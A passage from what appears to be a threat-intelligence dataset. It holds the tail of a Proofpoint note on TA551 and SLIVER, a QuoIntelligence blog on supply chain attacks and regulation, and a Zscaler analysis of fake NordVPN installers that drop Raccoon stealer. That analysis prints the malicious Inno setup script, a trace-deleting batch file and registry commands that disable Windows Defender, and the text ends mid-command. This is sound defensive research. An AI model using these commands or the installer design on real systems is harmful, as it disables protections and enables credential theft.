leveraging initial access via email threat campaigns, TA551 would compromise a victim and potentially broker access to enable the deployment of Cobalt Strike and eventually ransomware. With SLIVER, TA551 actors can gain direct access and interact with victims immediately, with more direct capabilities for execution, persistence, and lateral movement. This potentially removes the reliance on secondary access. Proofpoint observed the following indicators of compromise: | **Indicator** | **Description** | | hXXp://carwaded[.]com/cbfsd/P9G7gD1E6t9w22zQj/cC9DHcTHUKJV/ugnbvdk0EInGgeCqaLEYILzxL/zes1?ref=wU4bJ1ZLhoMc8BcRMMqy&q=ELOKZymM | Document Payload | | hXXp://ruwejo[.]com/upload/admin.jsp | SLIVER C2 | | b7cc07bfc41e61a89e961dd5826fa2b4d47a85a5b5856d50f9a57667199635b3 | Document SHA256 | **Emerging Threats Signature** ETPRO MALWARE Sliver Framework HTTP C2 sessionInit"
annoctr,annoctr/AnnoCTR/text/dev/quoteintelligence_2021-01-27_supply-chain-attacks-cybersecurity-regulations.txt,quoteintelligence_2021-01-27_supply-chain-attacks-cybersecurity-regulations,G0044,"Supply Chain Attacks, Cybersecurity & Regulations: What to Expect in 2021 Jan 27, 2021 On 19 January, [Malwarebytes reported](https://blog.malwarebytes.com/malwarebytes-news/2021/01/malwarebytes-targeted-by-nation-state-actor-implicated-in-solarwinds-breach-evidence-suggests-abuse-of-privileged-access-to-microsoft-office-365-and-azure-environments/) that the nation-sponsored attackers behind last year’s [SolarWinds breach](https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html), dubbed “UNC2452” by FireEye, had successfully compromised its systems and accessed limited internal data. Malwarebytes was not a user of SolarWinds products, and the intrusion vector allegedly leveraged a separate vulnerability in an email protection product for Microsoft Office 365 and Microsoft Azure – one of Malwarebytes supply chain participants. The Rise of Supply Chain Attacks -------------------------------- Supply chain attacks are on the rise. The COVID-19 pandemic is only exacerbating the threat. Digital footprints are expanding even as the increased reliance on remote work and third-party vendors and services further distances organizations from visible IT infrastructure. Microsoft Office 365, the target of this recent attack, demonstrates an example of the growing risk of supply chain attacks. On 8 January, two weeks before the Malwarebytes disclosure, the [United States Cybersecurity and Infrastructure Security Agency (CISA) released](https://us-cert.cisa.gov/ncas/alerts/aa21-008a) an alert precisely detailing this attack vector Cybersecurity experts warn that one type of supply chain attack in particular – open source code attacks – is [rapidly increasing](https://blog.sonatype.com/2020-state-of-the-software-supply-chain-report): ### attacks According to a report from Sonatype, 929 such attacks were recorded between July 2019 and May 2020. Further, Sonatype warns of a 430% year-on-year increase in attacks targeting open source components directly to covertly infect key software supply chains. % ### year-on-year increase Threat Actors and Attack Vendors to Watch Out for in 2021 --------------------------------------------------------- Supply chain attacks come from various threat actors with a wide range of attack vectors, which all present unique security threats: ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== ""Gov_light"") ![](https://quointelligence.eu/wp-content/uploads/2020/03/Gov_light-150x150.png ""Gov_light"") ### Nation-State Threat Actors The scale and advanced nature of the SolarWinds breach has placed the attack and corresponding fallout in the spotlight. Incident responders implementing mitigations to prevent supply chain security weaknesses will need to acknowledge that attacks can come from an increasing variety of sources including nation-state actors. In 2020, researchers implicated the Chinese government-linked threat actor *APT40* in a[supply chain attack on Taiwanese government entities](https://mercury.quointelligence.eu/INTTicket/show/6449). The attack leveraged trusted relationships and privileged network access between government entities and their sub-contractors. Additionally, a group of Iranian government-linked APTs carried out large-scale espionage attacks against global entities leveraging, in part, compromises of their targets’ supply chains. [Request a Free Trial to Read Full Report in Mercury!](https://quointelligence.eu/talk-to-an-expert/) ### Update Hijacking and Code Signing Advanced Persistent Threat groups (APT), such as the Winnti group, have [previously compromised entities within their targets’ supply chains](https://mercury.quointelligence.eu/INTTicket/show/4613) and inserted malicious code into automatically distributed software updates, thus exploiting trusted links and undermining code signing measures. ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== ""code"") ![](https://quointelligence.eu/wp-content/uploads/2020/03/code-150x150.png ""code"") ![Malware Cybersecurity](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== ""malware"")![Malware Cybersecurity](https://quointelligence.eu/wp-content/uploads/2021/01/malware-1-150x150.png ""malware"") ### Open Source Attacks Attackers are increasingly attempting to covertly insert malware [into public open source code repositories](https://mercury.quointelligence.eu/INTTicket/show/4613). Numerous corporate and government entities are reliant on open source projects to accelerate development, but the increased vulnerability to supply chain attacks underpin their infrastructure and software. ### Mobile Apps In one instance, attackers [compromised a Ukrainian mobile application developer](https://www.wired.com/story/sandworm-android-malware/) and used that access to push a malicious update containing malware. Although Google caught this update and blocked its deployment, the attack brings to light a large attack surface, particularly against organizations with *Bring Your Own Device* (BYOD) policies. An employee running a malicious app could mistakenly grant an attacker comprehensive access to their employer’s systems, especially if no or inadequate security policies are in place for BYOD across the enterprise. ![Mobile Apps Cybersecurity](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== ""overload_2"")![Mobile Apps Cybersecurity](https://quointelligence.eu/wp-content/uploads/2020/03/overload_2-150x150.png ""overload_2"") ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== ""Supply Chain Blog"") ![](https://quointelligence.eu/wp-content/uploads/2021/01/Supply-Chain-Blog.png ""Supply Chain Blog"") ###### Infographic 1: Possible Impacts of New Supply Chain Approaches; © QuoIntelligence Tackling post-mortem supply chain attacks effectively ----------------------------------------------------- In all these supply chain intrusion vectors, reacting to an attack post-mortem is technically challenging and resource intensive, involving network and host-based forensics. To effectively mitigate such attacks, organizations should instead establish stringent risk management and auditing of third-party vendors. Limiting system exposure to third-party infrastructure additionally limits the potential impact of a successful supply chain attack. The widely covered SolarWinds Orion attack that affected around 18,000 entities should not be seen as an extraordinary anomaly, but as a single blip in a continuous uptick of threat actors launching campaigns exploiting similar weaknesses in supply chains. Particularly accelerated by the COVID-19 pandemic, [we forecast espionage-driven supply chain attacks will become a major part of the threat landscape in 2021](https://quointelligence.eu/2020/12/cyber-security-trends-in-2021/). Governments are recognizing this threat and are creating regulatory frameworks to strengthen the security and resilience of supply chains. Enhancing Sustainability, Human Rights and Ethical Practices into Supply Chain Security Frameworks -------------------------------------------------------------------------------------------------- (Virtual) supply chains move within broader economic and geopolitical circuits. Since [cybersecurity is strongly impacted by geopolitical trends and events](https://quointelligence.eu/2020/06/our-holistic-approach-to-cyber-threat-intelligence/), topics such as sustainability, human rights and ethical practices in supply chains are increasingly coming under government scrutiny. 2021 will see a continued effort to curtail these topics by introducing more stringent regulation to ensure the sustainability, ethics, and security of supply chains. New or stricter regulations will increase pressure on organizations. If companies are forced to quickly shift suppliers, they risk failing to put adequate security measures in place. The COVID-19 pandemic and consequent lockdowns has also interrupted global supply chains, highlighting global interdependencies and pushing states to enhance home-grown industries. For example, the Monetary Authority of Singapore (MAS) [recently imposed measures](https://www.straitstimes.com/tech/tech-news/mas-announces-new-banking-rules-for-singapore-after-solarwinds-cyber-attack-exposes) which require all financial institutions to assess supplier third-party technology vendors, ranging from an evaluation of security measures to assuring safe programming practices. In addition, the US Department of Commerce issued an interim final ruling on the Information and Communications Technology and Services (ICTS) supply chain [designed to prohibit certain ICTS Transactions from listed foreign adversaries](https://www.commerce.gov/news/press-releases/2021/01/commerce-department-issues-interim-rule-secure-icts-supply-chain) including China, Russia, Iran, North Korea, Cuba, and Venezuela. Further, the [UK government](https://www.gov.uk/government/speeches/foreign-secretary-on-the-situation-in-xinjiang-and-the-governments-response) is implementing measures to ensure supply chains are free from forced labor as the UK government aims to tackle human rights abuses against the Uighur minority in Xinjiang, China. Governmental Regulatory Approaches to Safeguard Supply Chains ------------------------------------------------------------- QuoIntelligence has gathered some key insights on recent supply chain measures in the EU and US with possible consequences for companies and other organizations: > > **European Union** > > > The European Commission is preparing legislation and will launch an action plan by 2021 that will [focus on shaping global supply chain sustainability](https://www.consilium.europa.eu/media/46999/st13512-en20.pdf) by promoting human rights, social and due diligence standards, and transparency. While the EU has not released any concrete details, the regulation will include the possibility of sanctioning companies that fail to monitor human rights and environmental standards. In the field of cybersecurity, the new [EU Cybersecurity Strategy](https://ec.europa.eu/commission/presscorner/detail/en/ip_20_2391) seeks to intensify supply chain security by promoting standardization and certification schemes and the diversification of suppliers. Similarly, the novel [Network and Information Systems Directive proposal](https://ec.europa.eu/digital-single-market/en/news/proposal-directive-measures-high-common-level-cybersecurity-ac5ross-union)(NIS) also contains provisions that seek to strengthen supply chain cybersecurity by requiring individual companies to address risks in it and supplier relationships. > > **United States of America** > > > The US Department of Commerce issued an interim ruling on the ICTS’ supply chain, designed to prohibit certain ICTS Transactions from listed foreign adversaries. President Biden also stated that the US needs to *“close supply chain vulnerabilities across a range of critical products on which the US is dangerously dependent on foreign suppliers.”* The Biden administration claims it will [monitor supply chain vulnerabilities](https://joebiden.com/supplychains/), designate vital products, and enhance resiliency, while also increasing domestic production and limiting anti-competitive practices that threaten those chains. Possible Impacts of New Supply Chain Approaches ----------------------------------------------- * **Greater Leverage by States to Control their Markets:** Novel approaches to supply chain security will possibly build on previous 5G network cybersecurity frameworks, allowing bans for certain companies under national security concerns, and thus augmenting states’ control over their markets. * **Increasing Protectionism:** New supply chain regulations could follow protectionist approaches as countries try to limit and secure their critical dependencies by enhancing domestic production and restricting access to offshore companies. * **More Stringent Supervisory Measures for Companies:** Companies will have to face a new reality of compliance costs and fines. Consequently, some might have to change business models if the cost of contracting, for example, domestic companies is higher; even putting at risk their forward supply chain if they fail to find appropriate alternative suppliers. Regulated models or voluntary frameworks. ----------------------------------------- Nations are shifting towards a more regulated model to enhance the security of supply chains. While interconnection with third-parties in foreign countries will remain, it is likely that protectionist measures will evolve and continue. While new regulatory models also consider voluntary frameworks, such as standards and certifications, there is a tendency towards more stringent compliance including fines and due diligence obligations. Consequently, companies will need to stay closely informed to avoid costs from either [new global cybersecurity threats](https://quointelligence.eu/cyber-threat-intelligence-01-2/) and protectionist regulations. How QuoIntelligence Secures Your Supply Chain --------------------------------------------- Supply chains are an accepted risk to organizations to ensure a continuity of service to customers, both external and internal to the enterprise. However, decision makers do not need to sacrifice security in the process. QuoIntelligence offers a Risk Intelligence services, to support Risk management in both the digital and physical domain. Learn about this offering which removes the uncertainty around companies and technologies. Become familiar with insight into past cyber incidents, brand vulnerabilities, and more plaguing key players. [Request Your Risk Intelligence Demo Today!](https://quointelligence.eu/talk-to-an-expert/) Join Our Newsletter. -------------------- Subscribe to our newsletter to receive Weekly Intelligence Summaries, cyber news, and exciting updates. Only valid business emails will be approved. Please enable JavaScript in your browser to complete this form.Name *FirstLastBusiness Email *Checkboxes ** I have read and agree to the [Privacy Policy](https://quointelligence.eu/privacy-policy). GDPR Agreement ** I consent to having this website store my submitted information so they can respond to my inquiry. WebsiteSubscribe"
annoctr,annoctr/AnnoCTR/text/dev/zscaler_2021-05-21_threat-actors-distribute-malicious-vpn.txt,zscaler_2021-05-21_threat-actors-distribute-malicious-vpn,G0032,"Threat Actors Distribute Malicious VPN Apps Masquerading as Popular Vendors May 21, 2021 ### **Introduction** In May 2021, Zscaler ThreatLabZ observed several new domains registered by a threat actor for distribution of spoofed and malicious versions of popular VPN softwares. Threat actors have shifted their tactics, techniques, and procedures (TTPs) to target VPN users over the past year, taking advantage of the increase in remote work and the popularity of VPN applications. We observed this particular actor spoofing VPN applications, such as NordVPN, F-secure Freedom VPN, Avast Secureline VPN, and Hotspot Shield, to distribute the infostealer known as Raccoon stealer. Several lookalike websites containing malicious download links were hosted on domains registered by the actor in May 2021 using the Njalla domain hosting provider. Njalla has been used in the past by advanced persistent threat (APT) actors, such as Lazarus and Sandworm. ThreatLabZ closely monitors the network infrastructure used by these threat actors, which led to the discovery of this campaign. For this blog, we performed a deep-dive technical analysis of the malicious setup files, the evasion techniques used, and the final payload delivered. ### **Attack flow** The attack starts when users visit a lookalike website registered by the threat actor to distribute VPN applications. As an example, **the domain: vpnnords[.]com** was registered by the attacker and used to host the webpage as shown in Figure 1. This page looks almost identical to the homepage of the legitimate NordVPN website. The only difference is that the “Download Free” button on this page leads to the download of a malicious NordVPN setup file hosted on a file-sharing website. The complete list of domains registered by the attacker to target VPN users is included in the IOCs section. ![Figure 1](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/fakeVPN/Picture%201.png) *Figure 1: Malicious webpage that looks similar to the legitimate NordVPN website* Download link of setup file: hxxps://filetransfer[.]io/data-package/tZCy19qQ/download The downloaded file looks like a legitimate setup file of NordVPN—it uses the same file icon and even displays the graphical user interface (GUI) of NordVPN—but performs malicious activities in the background, which we describe in detail in the technical analysis section. ### **Low detection by security vendors** All the domains used in this attack and registered by the threat actor have no detection on VirusTotal and all security vendors mark these domains as clean. One such example is shown in Figure 2. ![Figure 2](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/fakeVPN/Picture%202.png) *Figure 2: No detection for the malicious domain(s) on VirusTotal by security vendors* This highlights how this attack has been flying under the radar and the importance of proactive hunting techniques, which helped us discover these domains. ### **Technical analysis** For the purpose of technical analysis, we will consider the file with the MD5 hash: e157f55aff49fe53befa3484d5e2b575 ### **Static analysis** Similar to the legitimate NordVPN setup file, the fake NordVPN setup is packaged using Inno Installer, but the file structure inside the package is different. Figure 3 below shows the file structure for both legit and fake setup. ![Figure 3](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/fakeVPN/Picture%203_1.png) *Figure 3: File structure for Inno-packaged fake and legitimate NordVPN setup files* ### **[+] Inside the fake installation package** As shown in Figure 3 above, the package contains the following files. * **Legitimate NordVPN setup – NordVPNSetup.exe**. The NordVPNSetup.exe is the latest version of NordVPN with **MD5 hash: 4e6183906dfe035954ec0260c573ab03** * **Seven files for performing different malicious operations.** These files are described in more detail in the **“Component analysis”** section * **The Inno package installer script – install\_script.iss.** All the files inside the package are encrypted using a password as defined in the **[Setup] section** of the installer script **Note:** The Inno package installer script for the fake NordVPN setup is available in the appendix section ### **[+] Component analysis** In this section, we perform a technical analysis of the individual components packaged inside the malicious setup file. **Naming convention of component files** All the script (VBS and BAT) file components in this package follow a naming convention. The first few characters indicate the purpose of the script followed by an array of random characters appended to it. **Example:** # STRT indicates starting or initialization STRTbbbn7przuvwav4hbpbps.vbs = “STRT” + “bbbn7przuvwav4hbpbps” + “.vbs” # AVD indicates AV disable AVDbbbn7i3b4ho55ck6raahj.bat = “AVD” + “bbbn7i3b4ho55ck6raahj” + “.bat” # DEL indicates delete the components and cleanup DELbbbn7l3bnchd166d2hhhv.bat = “DEL” + “bbbn7l3bnchd166d2hhhv” + “.bat” #### **VBScript analysis** **MD5 hash**: b5d6f5e514757d7b075ed59d79b8f2e2 **Filename**: STRTbbbn7przuvwav4hbpbps.vbs This VBScript is big in size because of the inclusion of junk instructions, which declare a lot of variables that are not used anywhere in the code. After cleaning up, the script looks like shown in Figure 4. ![Figure 4](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/fakeVPN/Picture%204.png) *Figure 4: Cleaned up VBScript.* The main purpose of this script is to execute the three BAT files, described in the next section. The VBScript creates a delay between the execution of each BAT script using a random delay parameter, calculated as follows. Dim max,min max=9890 min=4890 Dim RNDM Randomize RNDM=((max)*Rnd+min) #### **BAT files analysis** **[Component #1: Disable security softwares]** **MD5 hash:** 7924178f4a19db114e1fbb2764b8b409 **Filename:** AVDbbbn7i3b4ho55ck6raahj.bat This BAT file is mainly responsible for disabling security software on the machine. It specifically targets Windows Defender and Exploit Guard. To disable the security service features, it leverages *reg.exe* to alter the Windows registry keys specific to Windows Defender and Exploit Guard. In addition, the file disables system services and scheduled tasks related to Windows Defender. Similar to the VBS file, this BAT file is large. This is because long strings of Base64-encoded data are included in the file and the commands are inserted between them, as shown in Figure 5. ![Figure 5](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/fakeVPN/Picture%205.png) *Figure 5: Commands inserted between Base64-encoded blobs in the BAT file* The complete list of commands executed by this BAT file to disable security services and features is included in Appendix. **[Component #2: Main]** **MD5 hash:** b3a6b11fcf113f692648bc8f0f3f898e **Filename:** main.bat This BAT file uses a byte order mark (BOM) in the first two bytes, in which it displays only Unicode characters when the file is opened using Notepad++ or any other text editor. The first two bytes are {0xFF 0xFE} as shown in Figure 6. ![Figure 6](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/fakeVPN/Picture%206.png) *Figure 6: Byte order mark (BOM) inserted in first two bytes of the BAT file* Once we delete these two bytes, we can view the contents successfully with a text editor, such as Notepad++, as shown in Figure 7. ![Figure 7](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/fakeVPN/Picture%207.png) Figure 7: Cleaned BAT file The main actions performed by this BAT file are: 1.Creates a temp directory called ""extracted"" in the current directory 2.Renames the encrypted file.bin to file.zip 3.Decrypts and extracts the contents of file.zip using the password: ""\_\_\_\_\_\_\_\_\_\_\_7876pwd4897pwd19506\_\_\_\_\_\_\_\_\_\_\_"" 4.Extracts all the components after decrypting and renames file.zip to file.bin 5.Executes sihost.exe After further analysis, we discovered that an open-source anti-antivirus obfuscator was used to package the files. This obfuscator will generate a BAT file and package everything using 7zip to create an encrypted and password-protected, multilayer archive file. This GitHub project was used by the threat actor: https://github.com/hXR16F/AntiAV In our case, the archive file is called file.bin **MD5 hash**: b2880d44773178644ff13d755e96d5e2 **FIlename**: file.bin This is an encrypted ZIP archive that, when decrypted, with the password *“\_\_\_\_\_\_\_\_\_\_\_7876pwd4897pwd19506\_\_\_\_\_\_\_\_\_\_\_”* contains the following main components: AntiAV.data Sihost.exe - 32-bit .NET Binary **[Component #3: Cleanup]** **MD5 hash:** 228c709d87e5ff50e7d5c05b1a7f6c03 **Filename:** DELbbbn7l3bnchd166d2hhhv.bat Deletes all the components that were used in the initialization stage of the setup. @echo off timeout /T 60 /NOBREAK > Nul Del /f /q ""AVDbbbn7i3b4ho55ck6raahj.bat"" Del /f /q ""STRTbbbn7przuvwav4hbpbps.vbs"" Del /f /q ""STR2bbbn7przuvwav4hbpbps.vbs"" Del /f /q ""7z.dll"" Del /f /q ""7z.exe"" Del /f /q ""main.bat"" Del /f /q ""file.bin"" Del /f /q ""LODbbbn7pkeaxe7obg0ydlex.bat"" Del /f /q ""DELbbbn7l3bnchd166d2hhhv.bat"" ### **Dynamic analysis** When the Inno packaged fake NordVPN setup is executed, it extracts the legitimate NordVPN setup file to the path: *""%ProgramFiles%\"" or ""%ProgramFiles(x86)%\""*, while all the malicious operation-related files are extracted to the path *""%SystemDrive%\ProgramData\SZUCiTYO44EalgWu\""*. As per the [Run] section of the installer Inno script, the legitimate NordVPN setup is executed first, followed by the malicious VBScript execution. Operating in this order prevents the end-user from suspecting that any malicious activity is being performed on the user's machine. Figure 8 below shows the installation window that is displayed to the end-user as a result of legitimate NordVPN setup execution, while the malicious activity is being performed in the background. ![Figure 8](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/fakeVPN/Picture%208.png) *Figure 8: Installation window shown to the end-user* **[+] .Net binary analysis** As described earlier, the VBS and BAT scripts' execution finally results in dropping and executing the .NET binary with the name, sihost.exe. Similar to all the payloads in the infection chain, the .NET binary is obfuscated and consists of multiple layers that make binary analysis difficult and help to bypass the AV products. **// Main binary** The main binary has the project name **“StarEggControl”**. On execution, it loads the next layer binary, which is stored as an image in the resource section with the full resource path **“StarEggControl.frmSolucao2.image1”** and it is constructed using individual pixel information from the stored image. The code responsible for binary construction is shown in Figure 9 below. ![Figure 9](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/fakeVPN/Picture%209.png) *Figure 9: Image to binary construction using individual pixels* Once the binary construction is complete, the binary is loaded as a runtime module. The module is a .NET DLL with the name SampleUI.dll. Code execution is transferred to this DLL by calling SampleUI.MDI class with three parameters: **ugz1:** ""54776F5061746873"" – Encoded resource name for next layer binary **ugz3:** ""59596A6F71"" – Encoded key which is used to decrypt the next layer binary **projname:** “StarEggControl” – Project name of main .NET binary **// SampleUI.dll** Similar to the previous layer, the SampleUI.dll also loads the next layer binary, which is stored as a bitmap image inside the resources of the main binary itself. The resource name when decoded using the parameter ugz1 is: **""TwoPaths""** and the full resource path is: **“StarEggControl.Resources.TwoPaths”**. The next-layer binary is constructed from the retrieved Bitmap image using a custom algorithm implementation that uses XOR operation. The XOR key is derived using the parameter *ugz3* which turns out to be **""YYjoq""**. The constructed binary is again loaded as a runtime module, which is also a .NET DLL with the name **“公jrxl的A太 wCe”**. Code execution is transferred to the DLL by calling the class with the name: **“公jrxl的A太 wCe.d司J物rU族家的v行是o.z官司C生bqT的A”.** Please note that the class and method names inside the .NET binary contain Unicode characters to deter the process of static analysis and reverse engineering. Figure 10 below shows the code flow for binary construction, loading, and transfer of code execution. ![Figure 10](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/fakeVPN/Picture%2010.png) *Figure 10: Decoding the bitmap to binary and transferring execution* **// 公jrxl的A太 wCe** This is the final layer, which is responsible for loading and executing the main malware payload of the infection chain. The malware payload is stored among the resources of this final layer DLL with the resource name **“ifF3K”**. Like previous layers, the main malware payload is present in encrypted form. Executing further, the malware payload is decrypted, a new suspended version of the main .NET binary sihost.exe is created, and the malware payload is injected into the suspended process using the Hollow Process Injection technique. The injected malware payload is the well-known information stealerknown as Raccoon stealer. ### **Similar builds but different themes** Pivoting on the package build, we found more than 500 samples (more than 50% of these samples have less than 10 detections) and two additional themes being used to deliver malware payload—one was related to multimedia applications and the other to security softwares. We have not confirmed whether the Raccoon stealer is the final payload for all the samples, but they seem similar to the current attack. ### **Zscaler Cloud Sandbox report** ![Figure 11](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/fakeVPN/Picture%2011.png) *Figure 11: Zscaler Cloud Sandbox report* In addition to sandbox detections, Zscaler’s multilayered cloud security platform detects indicators at various levels. - [HTML.MalURL.NordVPN](https://threatlibrary.zscaler.com/?keyword=HTML.MalURL.NordVPN) - [Win32.PWS.Raccoon](https://threatlibrary.zscaler.com/?keyword=Win32.PWS.Raccoon) ### **MITRE ATT&CK TTP mapping** | **ID** | **Tactic** | **Technique** | | T1566 | Phishing | Attacker hosted fake websites leading to malicious file download | | T1204.002 | User Execution: Malicious File | User executes the downloaded file | | T1140 | Deobfuscate/Decode Files or Information | Strings and other data are obfuscated in the payloads | | T1027.002 | Obfuscated Files or Information: Software Packing | Payloads are packed in layers | | T1070.004 | Indicator Removal on Host: File Deletion | Deletes all the components which were used in the initialization stage | | T1055.012 | Process Injection: Process Hollowing | Use hollow process injection technique to execute the final malware payload | | T1562 | Impair Defenses | Disables Windows Defender features and log audits | | T1124 | System Time Discovery | One of Raccoon capabilities | | T1087 | Account Discovery | One of Raccoon capabilities | | T1124 | File and Directory Discovery | One of Raccoon capabilities | | T1057 | Process Discovery | One of Raccoon capabilities | | T1012 | Query Registry | One of Raccoon capabilities | | T1113 | Screen Capture | One of Raccoon capabilities | | T1082 | System Information Discovery | One of Raccoon capabilities | | T1016 | System Network Configuration Discovery | One of Raccoon capabilities | | T1573.001 | Encrypted Channel: Symmetric Cryptography | One of Raccoon capabilities | ### ### **Indicators of compromise** **Hashes** | **MD5** | **Description** | | e157f55aff49fe53befa3484d5e2b575 | NordVPNsetup.exe | | b5d6f5e514757d7b075ed59d79b8f2e2 | STRTbbbn7przuvwav4hbpbps.vbs | | 7924178f4a19db114e1fbb2764b8b409 | AVDbbbn7i3b4ho55ck6raahj.bat | | b3a6b11fcf113f692648bc8f0f3f898e | main.bat | | 228c709d87e5ff50e7d5c05b1a7f6c03 | DELbbbn7l3bnchd166d2hhhv.bat | | b2880d44773178644ff13d755e96d5e2 | file.bin | | 0d2acc1da9ea3c2f98bcbc3ce872beb7 | Raccoon Stealer | **// Few other VPN packages** | **MD5** | **Description** | | 67516c2a72880e674795b0a9a1edcb36 | FSecureFreedomeVPN.exe | | fabc80d1a8c2c580f04550c34247e24d | avast\_vpn\_online\_setup.x64.exe | **Malicious domains** vpnnords[.]com nordsfreevpn[.]com nordsecure[.]click vpn-nord[.]net **Dropped files** %ProgramFiles%\NordVPNSetup.exe OR %ProgramFiles(x86)%\NordVPNSetup.exe %SystemDrive%\ProgramData\SZUCiTYO44EalgWu\7z.exe %SystemDrive%\ProgramData\SZUCiTYO44EalgWu\7z.dll %SystemDrive%\ProgramData\SZUCiTYO44EalgWu\file.bin %SystemDrive%\ProgramData\SZUCiTYO44EalgWu\main.bat %SystemDrive%\ProgramData\SZUCiTYO44EalgWu\AVDbbbn7i3b4ho55ck6raahj.bat %SystemDrive%\ProgramData\SZUCiTYO44EalgWu\DELbbbn7l3bnchd166d2hhhv.bat %SystemDrive%\ProgramData\SZUCiTYO44EalgWu\STRTbbbn7przuvwav4hbpbps.vbs %SystemDrive%\ProgramData\SZUCiTYO44EalgWu\sihost.exe ### **Appendix** **// install\_script.iss from fake NordVPN Inno package** ;InnoSetupVersion=6.0.0 (Unicode) **[Setup]** AppName=SZUCiTYOSZUCiTYO IJiEalgWu AppId=SZUCiTYOSZUCiTYO IJiEalgWu AppVersion=44.9.9.9440 AppPublisher=EalgWuSZUCiTYOIJi EalgWu DefaultDirName={autopf} OutputBaseFilename=NordVPNSetup Compression=lzma ; Encryption=yes ; PasswordHash=b525fbe0090152aa48b9e832d1c72bdc48e94461 ; PasswordSalt=702a76b833fdb38f Uninstallable=no DisableDirPage=yes DisableProgramGroupPage=yes WizardImageFile=embedded\WizardImage0.bmp WizardSmallImageFile=embedded\WizardSmallImage0.bmp **[Files]** Source: ""{app}\NordVPNSetup.exe""; DestDir: ""{app}""; MinVersion: 0.0,6.0; Flags: deleteafterinstall ignoreversion Source: ""{sd}\ProgramData\SZUCiTYO44EalgWu\7z.exe""; DestDir: ""{sd}\ProgramData\SZUCiTYO44EalgWu""; MinVersion: 0.0,6.0; Flags: ignoreversion Source: ""{sd}\ProgramData\SZUCiTYO44EalgWu\7z.dll""; DestDir: ""{sd}\ProgramData\SZUCiTYO44EalgWu""; MinVersion: 0.0,6.0; Flags: ignoreversion Source: ""{sd}\ProgramData\SZUCiTYO44EalgWu\file.bin""; DestDir: ""{sd}\ProgramData\SZUCiTYO44EalgWu""; MinVersion: 0.0,6.0; Flags: ignoreversion Source: ""{sd}\ProgramData\SZUCiTYO44EalgWu\main.bat""; DestDir: ""{sd}\ProgramData\SZUCiTYO44EalgWu""; MinVersion: 0.0,6.0; Flags: ignoreversion Source: ""{sd}\ProgramData\SZUCiTYO44EalgWu\AVDbbbn7i3b4ho55ck6raahj.bat""; DestDir: ""{sd}\ProgramData\SZUCiTYO44EalgWu""; MinVersion: 0.0,6.0; Flags: ignoreversion Source: ""{sd}\ProgramData\SZUCiTYO44EalgWu\DELbbbn7l3bnchd166d2hhhv.bat""; DestDir: ""{sd}\ProgramData\SZUCiTYO44EalgWu""; MinVersion: 0.0,6.0; Flags: ignoreversion Source: ""{sd}\ProgramData\SZUCiTYO44EalgWu\STRTbbbn7przuvwav4hbpbps.vbs""; DestDir: ""{sd}\ProgramData\SZUCiTYO44EalgWu""; MinVersion: 0.0,6.0; Flags: ignoreversion **[Run]** Filename: ""{app}\NordVPNSetup.exe""; Description: ""{cm:LaunchProgram,SZUCiTYOSZUCiTYO IJiEalgWu}""; MinVersion: 0.0,6.0; Flags: postinstall skipifsilent nowait Filename: ""{sd}\ProgramData\SZUCiTYO44EalgWu\STRTbbbn7przuvwav4hbpbps.vbs""; Description: ""{cm:LaunchProgram,Generator}""; MinVersion: 0.0,6.0; Flags: shellexec nowait **[CustomMessages]** default.NameAndVersion=%1 version %2 default.AdditionalIcons=Additional shortcuts: default.CreateDesktopIcon=Create a &desktop shortcut default.CreateQuickLaunchIcon=Create a &Quick Launch shortcut default.ProgramOnTheWeb=%1 on the Web default.UninstallProgram=Uninstall %1 default.LaunchProgram=Launch %1 default.AssocFileExtension=&Associate %1 with the %2 file extension default.AssocingFileExtension=Associating %1 with the %2 file extension... default.AutoStartProgramGroupDescription=Startup: default.AutoStartProgram=Automatically start %1 default.AddonHostProgramNotFound=%1 could not be located in the folder you selected.%n%nDo you want to continue anyway. **[Languages]** ; These files are stubs ; To achieve better results after recompilation, use the real language files Name: ""default""; MessagesFile: ""embedded\default.isl""; **// Commands executed to disable system security services** reg add ""HKLM\Software\Microsoft\Windows Defender\Features"" /v ""TamperProtection"" /t REG\_DWORD /d ""0"" /f"" reg delete ""HKLM\Software\Policies\Microsoft\Windows Defender"" /f"" reg add ""HKLM\Software\Policies\Microsoft\Windows Defender"" /v ""DisableAntiSpyware"" /t REG\_DWORD /d ""1"" /f"" reg add ""HKLM\Software\Policies\Microsoft\Windows Defender"" /v ""DisableAntiVirus"" /t REG\_DWORD /d ""1"" /f"" reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine"" /v ""MpEnablePus"" /t REG\_DWORD /d ""0"" /f"" reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableBehaviorMonitoring"" /t REG\_DWORD /d ""1"" /f"" reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableIOAVProtection"" /t REG\_DWORD /d ""1"" /f"" reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableOnAccessProtection"" /t REG\_DWORD /d ""1"" /f"" reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableRealtimeMonitoring"" /t REG\_DWORD /d ""1"" /f"" reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableScanOnRealtimeEnable"" /t REG\_DWORD /d ""1"" /f"" reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Reporting"" /v 